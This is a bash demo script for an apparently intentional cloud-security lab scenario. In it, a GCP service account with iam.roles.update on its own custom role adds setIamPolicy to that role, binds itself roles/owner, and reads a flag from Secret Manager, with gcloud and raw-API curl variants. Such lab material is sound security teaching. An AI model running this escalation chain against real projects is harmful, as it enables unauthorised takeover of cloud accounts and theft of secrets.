#!/bin/bash

# Demo script for gcp-iam-003-iam-rolesupdate privilege escalation
#
# Attack: starting_sa is bound to a project custom role that includes iam.roles.update.
# It updates that same custom role to add resourcemanager.projects.setIamPolicy,
# then uses the newly-acquired permission to self-bind roles/owner on the project.
#
# This is a self-escalation — there is no second principal. The attacker IS
# the starting SA throughout. All exploit commands run as starting_sa via
# --impersonate-service-account.
#
# Modes:
#   Default (gcloud): uses gcloud iam roles update --add-permissions and
#     gcloud projects add-iam-policy-binding — natural attacker commands, but
#     gcloud makes extra preflight calls (GetRole, GetIamPolicy) beyond the
#     raw API minimum.
#
#   --api-only: calls the IAM REST API (roles.patch) and Cloud Resource Manager
#     REST API (setIamPolicy) directly. Proves that only iam.roles.update and
#     resourcemanager.projects.setIamPolicy are strictly required — no extra
#     gcloud-mechanic overhead.

# Parse --api-only flag
USE_GCLOUD=true
for arg in "$@"; do
    case "$arg" in
        --api-only) USE_GCLOUD=false ;;
    esac
done

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'
DIM='\033[2m'

ATTACK_COMMANDS=()

show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Like show_attack_cmd but does not add to the summary — use for illustrative
# steps that show intermediate calls but are not the core exploit commands.
show_illustrative_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
}

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}GCP-IAM-003: Custom Role Update Self-Escalation to Admin Demo${NC}"
if $USE_GCLOUD; then
    echo -e "${GREEN}Mode: gcloud (default)${NC}"
    echo "  Uses gcloud CLI — clearest command sequence, but requires extra gcloud-mechanic permissions."
    echo "  Run with --api-only for the minimal raw-API version."
else
    echo -e "${GREEN}Mode: raw API (--api-only)${NC}"
    echo "  Uses the raw REST API — minimal permission surface, no gcloud-mechanic overhead."
fi
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve scenario configuration from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../../../gcp  # scenario dir -> gcp/ (terraform root)

MODULE_OUTPUT=$(terraform output -json 2>/dev/null | \
    jq -r '.gcp_single_account_privesc_self_escalation_to_admin_gcp_iam_003_iam_rolesupdate.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you have deployed this scenario: plabs apply"
    exit 1
fi

STARTING_SA_EMAIL=$(echo "$MODULE_OUTPUT"     | jq -r '.starting_sa_email')
DEPLOYER_EMAIL=$(echo "$MODULE_OUTPUT"        | jq -r '.deployer_email')
EDITABLE_ROLE_FULL_ID=$(echo "$MODULE_OUTPUT" | jq -r '.editable_role_id')
FLAG_SECRET_ID=$(echo "$MODULE_OUTPUT"        | jq -r '.flag_secret_id')
PROJECT_ID=$(terraform output -raw gcp_project_id 2>/dev/null)

cd - > /dev/null

for var_name in STARTING_SA_EMAIL DEPLOYER_EMAIL EDITABLE_ROLE_FULL_ID FLAG_SECRET_ID PROJECT_ID; do
    val="${!var_name}"
    if [ -z "$val" ] || [ "$val" = "null" ]; then
        echo -e "${RED}Error: Could not extract $var_name from Terraform output${NC}"
        exit 1
    fi
done

# Extract the bare role ID (trailing component) for gcloud subcommands
EDITABLE_ROLE_ID=$(echo "$EDITABLE_ROLE_FULL_ID" | sed 's|.*/||')

echo "Starting SA (the attacker):  $STARTING_SA_EMAIL"
echo "Editable custom role:        $EDITABLE_ROLE_FULL_ID"
echo "Flag secret:                 $FLAG_SECRET_ID"
echo "Deployer (your ADC):         $DEPLOYER_EMAIL"
echo "Project:                     $PROJECT_ID"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Hard-fail if the active gcloud CLI account differs from the deployer who holds
# the impersonation grant. A mismatch means every --impersonate-service-account
# call below will fail with PERMISSION_DENIED.
CURRENT_ADC_EMAIL=$(gcloud auth list --filter=status:ACTIVE --format='value(account)' 2>/dev/null | head -1)
if [ -n "$CURRENT_ADC_EMAIL" ] && [ "$CURRENT_ADC_EMAIL" != "$DEPLOYER_EMAIL" ]; then
    echo -e "${RED}Error: Your active gcloud account ($CURRENT_ADC_EMAIL) differs from the${NC}"
    echo -e "${RED}deployer account that provisioned the impersonation grant ($DEPLOYER_EMAIL).${NC}"
    echo -e "${RED}Run: gcloud auth login --update-adc${NC}"
    echo -e "${RED}This sets both your gcloud CLI session and ADC to the same identity.${NC}"
    echo -e "${RED}Then re-run 'terraform apply' if the deployer identity changed.${NC}\n"
    exit 1
fi

echo -e "${YELLOW}Waiting for IAM bindings to propagate (15s)...${NC}"
sleep 15
echo -e "${GREEN}✓ Propagation wait complete${NC}\n"

# Step 2: [RECON] Confirm starting SA identity and lack of admin access
echo -e "${YELLOW}Step 2: [RECON] Confirming starting SA cannot read the flag (pre-attack baseline)${NC}"

show_cmd "$STARTING_SA_EMAIL" \
    "gcloud secrets versions access latest --secret=$FLAG_SECRET_ID --impersonate-service-account=$STARTING_SA_EMAIL (expected: PERMISSION_DENIED)"
if gcloud secrets versions access latest \
        --secret="$FLAG_SECRET_ID" \
        --project="$PROJECT_ID" \
        --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null; then
    echo -e "${YELLOW}Note: starting SA can already read the secret — check IAM bindings${NC}"
else
    echo -e "${GREEN}✓ Confirmed: starting SA cannot read the flag (no secretAccessor, as expected)${NC}"
fi
echo ""

# [RECON] Enumerate project custom roles — identify the one the SA can update
show_cmd "$STARTING_SA_EMAIL" \
    "gcloud iam roles list --project=$PROJECT_ID --impersonate-service-account=$STARTING_SA_EMAIL"
gcloud iam roles list \
    --project="$PROJECT_ID" \
    --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null || true
echo ""

# [RECON] Describe the editable role — confirm it includes iam.roles.update
show_cmd "$STARTING_SA_EMAIL" \
    "gcloud iam roles describe $EDITABLE_ROLE_ID --project=$PROJECT_ID --impersonate-service-account=$STARTING_SA_EMAIL"
gcloud iam roles describe "$EDITABLE_ROLE_ID" \
    --project="$PROJECT_ID" \
    --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null || true
echo -e "${GREEN}✓ Identified editable custom role with iam.roles.update — THE VULNERABILITY${NC}\n"

# Step 3: [EXPLOIT] Add resourcemanager.projects.setIamPolicy to the editable role
#
# This is the first half of the attack chain:
#   starting_sa has iam.roles.update on the custom role it is BOUND TO.
#   It modifies that role to include resourcemanager.projects.setIamPolicy.
#   After propagation, the custom role (and therefore starting_sa) now grants
#   the ability to modify project-level IAM policy bindings.
echo -e "${YELLOW}Step 3: [EXPLOIT] Adding resourcemanager.projects.setIamPolicy to the editable custom role${NC}"

if $USE_GCLOUD; then
    # gcloud reads the role first (iam.roles.get — a gcloud mechanic), then writes
    # the full includedPermissions list with the addition appended.
    show_attack_cmd "$STARTING_SA_EMAIL" \
        "gcloud iam roles update $EDITABLE_ROLE_ID --project=$PROJECT_ID --add-permissions=resourcemanager.projects.setIamPolicy --impersonate-service-account=$STARTING_SA_EMAIL"
    if ! gcloud iam roles update "$EDITABLE_ROLE_ID" \
            --project="$PROJECT_ID" \
            --add-permissions=resourcemanager.projects.setIamPolicy \
            --impersonate-service-account="$STARTING_SA_EMAIL" \
            --quiet 2>/dev/null; then
        echo -e "${RED}✗ Failed to update custom role${NC}"
        exit 1
    fi
    echo -e "${GREEN}✓ Added resourcemanager.projects.setIamPolicy to $EDITABLE_ROLE_ID${NC}\n"
else
    # Raw API mode — roles.patch with updateMask=includedPermissions replaces the
    # full permission list atomically. iam.roles.get is a gcloud mechanic: gcloud
    # reads the role before writing via --add-permissions. The raw PATCH does not
    # require it. We GET here only to preserve existing permissions safely; the
    # attack's required permission is only iam.roles.update.

    # Mint a starting_sa token for use throughout all --api-only steps
    ACCESS_TOKEN=$(gcloud auth print-access-token \
        --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null)
    [ -z "$ACCESS_TOKEN" ] && { echo -e "${RED}✗ Failed to mint starting SA token${NC}"; exit 1; }

    echo -e "\n${DIM}Step 3a (raw API — read current role permissions to build the patched list;${NC}"
    echo -e "${DIM}         iam.roles.get is a helpful permission used here but NOT required by the raw PATCH):${NC}"
    show_illustrative_cmd "$STARTING_SA_EMAIL" \
        "curl -s -H 'Authorization: Bearer \$ACCESS_TOKEN' 'https://iam.googleapis.com/v1/$EDITABLE_ROLE_FULL_ID'"
    CURRENT_ROLE=$(curl -s \
        -H "Authorization: Bearer $ACCESS_TOKEN" \
        "https://iam.googleapis.com/v1/$EDITABLE_ROLE_FULL_ID")
    CURRENT_PERMISSIONS=$(echo "$CURRENT_ROLE" | jq -c '.includedPermissions // []')
    if [ -z "$CURRENT_PERMISSIONS" ] || [ "$CURRENT_PERMISSIONS" = "null" ]; then
        echo -e "${RED}✗ Failed to read current role permissions${NC}"
        echo "$CURRENT_ROLE"
        exit 1
    fi
    echo -e "${GREEN}✓ Current permissions: $CURRENT_PERMISSIONS${NC}"

    # Append the new permission and deduplicate
    NEW_PERMISSIONS=$(echo "$CURRENT_PERMISSIONS" | \
        jq -c '. + ["resourcemanager.projects.setIamPolicy"] | unique')

    echo -e "\n${DIM}Step 3b (raw API — PATCH the role; updateMask=includedPermissions replaces the full list):${NC}"
    show_attack_cmd "$STARTING_SA_EMAIL" \
        "curl -X PATCH -H 'Authorization: Bearer \$ACCESS_TOKEN' -d '{\"includedPermissions\": [...+\"resourcemanager.projects.setIamPolicy\"]}' 'https://iam.googleapis.com/v1/$EDITABLE_ROLE_FULL_ID?updateMask=includedPermissions'"
    PATCH_RESPONSE=$(curl -s -X PATCH \
        -H "Authorization: Bearer $ACCESS_TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"includedPermissions\": $NEW_PERMISSIONS}" \
        "https://iam.googleapis.com/v1/$EDITABLE_ROLE_FULL_ID?updateMask=includedPermissions")
    if ! echo "$PATCH_RESPONSE" | jq -e '.name' >/dev/null 2>&1; then
        echo -e "${RED}✗ Failed to patch custom role${NC}"
        echo "$PATCH_RESPONSE"
        exit 1
    fi
    echo -e "${GREEN}✓ Patched $EDITABLE_ROLE_FULL_ID with resourcemanager.projects.setIamPolicy (raw API)${NC}\n"
fi

echo -e "${YELLOW}Waiting for IAM policy to propagate (15s)...${NC}"
sleep 15
echo -e "${GREEN}✓ Policy propagated${NC}\n"

# Step 4: [EXPLOIT] Self-bind roles/owner using the newly-acquired setIamPolicy permission
#
# This is the second half of the attack chain:
#   The custom role now grants resourcemanager.projects.setIamPolicy.
#   starting_sa uses it to add itself as roles/owner on the project,
#   gaining full administrative access.
echo -e "${YELLOW}Step 4: [EXPLOIT] Self-binding roles/owner on the project using resourcemanager.projects.setIamPolicy${NC}"

if $USE_GCLOUD; then
    # gcloud calls GetIamPolicy before writing (resourcemanager.projects.getIamPolicy —
    # a gcloud mechanic). add-iam-policy-binding is an additive read-modify-write.
    show_attack_cmd "$STARTING_SA_EMAIL" \
        "gcloud projects add-iam-policy-binding $PROJECT_ID --member=serviceAccount:$STARTING_SA_EMAIL --role=roles/owner --impersonate-service-account=$STARTING_SA_EMAIL"
    if ! gcloud projects add-iam-policy-binding "$PROJECT_ID" \
            --member="serviceAccount:$STARTING_SA_EMAIL" \
            --role="roles/owner" \
            --impersonate-service-account="$STARTING_SA_EMAIL" \
            --quiet 2>/dev/null; then
        echo -e "${RED}✗ Failed to add roles/owner binding${NC}"
        exit 1
    fi
    echo -e "${GREEN}✓ Self-bound roles/owner on $PROJECT_ID as $STARTING_SA_EMAIL${NC}\n"
else
    # Raw API mode — POST projects:setIamPolicy directly.
    # resourcemanager.projects.getIamPolicy is a gcloud mechanic: gcloud reads the
    # policy before every add-iam-policy-binding. The raw setIamPolicy API does not
    # require it. We GET here only to preserve existing bindings safely; the attack's
    # required permission is only resourcemanager.projects.setIamPolicy.

    # Refresh the starting_sa token (the previous one was minted before propagation waits)
    ACCESS_TOKEN=$(gcloud auth print-access-token \
        --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null)
    [ -z "$ACCESS_TOKEN" ] && { echo -e "${RED}✗ Failed to refresh starting SA token${NC}"; exit 1; }

    echo -e "\n${DIM}Step 4a (raw API — read current project policy to preserve existing bindings;${NC}"
    echo -e "${DIM}         resourcemanager.projects.getIamPolicy is helpful here but NOT required by setIamPolicy):${NC}"
    show_illustrative_cmd "$STARTING_SA_EMAIL" \
        "curl -s -X POST -H 'Authorization: Bearer \$ACCESS_TOKEN' -d '{}' 'https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}:getIamPolicy'"
    CURRENT_POLICY=$(curl -s -X POST \
        -H "Authorization: Bearer $ACCESS_TOKEN" \
        -H "Content-Type: application/json" \
        -d '{}' \
        "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}:getIamPolicy")
    if ! echo "$CURRENT_POLICY" | jq -e '.bindings' >/dev/null 2>&1; then
        echo -e "${RED}✗ Failed to read current project IAM policy${NC}"
        echo "$CURRENT_POLICY"
        exit 1
    fi
    echo -e "${GREEN}✓ Read current project IAM policy${NC}"

    # Add the roles/owner binding for starting_sa to the existing bindings
    NEW_OWNER_BINDING="{\"role\": \"roles/owner\", \"members\": [\"serviceAccount:$STARTING_SA_EMAIL\"]}"
    UPDATED_POLICY=$(echo "$CURRENT_POLICY" | jq -c \
        --argjson binding "$NEW_OWNER_BINDING" \
        '.bindings += [$binding]')

    echo -e "\n${DIM}Step 4b (raw API — POST setIamPolicy with the owner binding added):${NC}"
    show_attack_cmd "$STARTING_SA_EMAIL" \
        "curl -X POST -H 'Authorization: Bearer \$ACCESS_TOKEN' -d '{\"policy\": {...+roles/owner}}' 'https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}:setIamPolicy'"
    SET_RESPONSE=$(curl -s -X POST \
        -H "Authorization: Bearer $ACCESS_TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"policy\": $UPDATED_POLICY}" \
        "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}:setIamPolicy")
    if ! echo "$SET_RESPONSE" | jq -e '.bindings' >/dev/null 2>&1; then
        echo -e "${RED}✗ Failed to set project IAM policy${NC}"
        echo "$SET_RESPONSE"
        exit 1
    fi
    echo -e "${GREEN}✓ Self-bound roles/owner on $PROJECT_ID as $STARTING_SA_EMAIL (raw API)${NC}\n"
fi

echo -e "${YELLOW}Waiting for IAM policy to propagate (15s)...${NC}"
sleep 15
echo -e "${GREEN}✓ Policy propagated${NC}\n"

# Step 5: [EXPLOIT] Read the CTF flag as the escalated starting SA
#
# roles/owner includes secretmanager.versions.access, so starting_sa can now
# read the flag directly — no second principal needed.
echo -e "${YELLOW}Step 5: [EXPLOIT] Reading the CTF flag as the escalated starting SA (roles/owner)${NC}"

if $USE_GCLOUD; then
    show_attack_cmd "$STARTING_SA_EMAIL (roles/owner)" \
        "gcloud secrets versions access latest --secret=$FLAG_SECRET_ID --impersonate-service-account=$STARTING_SA_EMAIL"
    FLAG_VALUE=$(gcloud secrets versions access latest \
        --secret="$FLAG_SECRET_ID" \
        --project="$PROJECT_ID" \
        --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null)
else
    # Mint a fresh token so the new roles/owner grant is reflected in the token's
    # authorization check at the Secret Manager endpoint.
    OWNER_TOKEN=$(gcloud auth print-access-token \
        --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null)
    [ -z "$OWNER_TOKEN" ] && { echo -e "${RED}✗ Failed to mint owner SA token${NC}"; exit 1; }

    show_attack_cmd "$STARTING_SA_EMAIL (roles/owner, raw API)" \
        "curl -s -H 'Authorization: Bearer \$OWNER_TOKEN' 'https://secretmanager.googleapis.com/v1/projects/${PROJECT_ID}/secrets/${FLAG_SECRET_ID}/versions/latest:access'"
    SECRET_RESPONSE=$(curl -s \
        -H "Authorization: Bearer $OWNER_TOKEN" \
        "https://secretmanager.googleapis.com/v1/projects/${PROJECT_ID}/secrets/${FLAG_SECRET_ID}/versions/latest:access")
    ENCODED_FLAG=$(echo "$SECRET_RESPONSE" | jq -r '.payload.data // empty')
    if [ -z "$ENCODED_FLAG" ]; then
        echo -e "${RED}✗ Failed to read flag${NC}"
        echo "$SECRET_RESPONSE"
        exit 1
    fi
    FLAG_VALUE=$(echo "$ENCODED_FLAG" | openssl base64 -d -A)
fi

if [ -z "$FLAG_VALUE" ]; then
    echo -e "${RED}✗ Failed to read flag from $FLAG_SECRET_ID${NC}"
    echo "The roles/owner binding may still be propagating — wait a few seconds and retry."
    exit 1
fi
echo -e "${GREEN}✓ Read Secret Manager secret as $STARTING_SA_EMAIL (roles/owner)${NC}\n"

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Flag:${NC} $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. starting_sa ($STARTING_SA_EMAIL) used iam.roles.update to add"
echo "   resourcemanager.projects.setIamPolicy to the custom role it was bound to"
echo "2. starting_sa used the newly-acquired setIamPolicy permission to self-bind"
echo "   roles/owner on project $PROJECT_ID"
echo "3. As roles/owner, starting_sa read the CTF flag directly from Secret Manager"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_SA_EMAIL"
echo "    -> (iam.roles.update on the editable custom role — THE VULNERABILITY)"
echo "    -> Added resourcemanager.projects.setIamPolicy to the custom role"
echo "    -> (resourcemanager.projects.setIamPolicy acquired at runtime)"
echo "    -> Self-bound roles/owner on project $PROJECT_ID"
echo "    -> CTF Flag (via secretmanager.versions.access included in roles/owner)"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Key Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

if $USE_GCLOUD; then
    echo -e "\n${YELLOW}Note on gcloud vs. raw API permissions:${NC}"
    echo "  This demo used gcloud — the natural tool for this attack. Two gcloud-mechanic"
    echo "  permissions are included in starting_sa's role but are NOT needed by the raw API:"
    echo ""
    echo "    iam.roles.get                         — gcloud calls GetRole before every 'roles update --add-permissions'"
    echo "    resourcemanager.projects.getIamPolicy  — gcloud calls GetIamPolicy before every 'projects add-iam-policy-binding'"
    echo ""
    echo "  To see the attack using only the true minimum permissions, run:"
    echo -e "  ${CYAN}\$ ./demo_attack.sh --api-only${NC}"
fi

echo -e "\n${YELLOW}To clean up:${NC} ./cleanup_attack.sh"
echo ""

touch "$(dirname "$0")/.demo_active"
